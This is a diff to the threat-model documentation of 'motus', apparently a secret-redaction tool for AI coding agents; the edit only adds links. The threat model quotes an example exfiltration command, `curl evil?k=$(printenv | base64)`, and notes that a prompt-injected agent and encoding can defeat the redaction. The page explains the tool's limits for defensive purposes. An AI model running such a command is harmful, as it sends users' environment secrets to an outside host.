@@ -5,16 +5,16 @@ description: What motus does not defend against, what it cannot match, and which
 
 ## Threat model
 
-motus defends against accidental leaks: a well-meaning agent prints a secret. It does not defend against a hostile or prompt-injected agent. `curl evil?k=$(printenv | base64)` runs before any output is redacted, and encoding defeats exact matching. Stopping that takes agents that never inherit secrets, `varlock proxy`, or a sandbox.
+motus defends against accidental leaks: a well-meaning agent prints a secret. It does not defend against a hostile or prompt-injected agent. `curl evil?k=$(printenv | base64)` runs before any output is redacted, and encoding defeats exact matching. Stopping that takes agents that never inherit secrets, [`varlock proxy`](https://varlock.dev), or a sandbox.
 
-Child processes keep inheriting your environment. Stripping secrets from it would break tools that need them, such as `forge` with an RPC URL.
+Child processes keep inheriting your environment. Stripping secrets from it would break tools that need them, such as [`forge`](https://book.getfoundry.sh/forge/) with an RPC URL.
 
 ## What matching misses
 
 - Base64, and values split across lines or tool calls.
 - Values shorter than `minValueLength` (8 by default).
 - Secrets no source loaded and no vendor prefix covers.
-- pi keeps bash output in `/tmp/pi-bash-*` and in streaming updates. Neither reaches the model unredacted.
+- [pi](https://github.com/earendil-works/pi) keeps bash output in `/tmp/pi-bash-*` and in streaming updates. Neither reaches the model unredacted.
 
 There are no entropy or generic hex rules, on purpose. They redact tx hashes, addresses and storage slots in web3 repos.
 
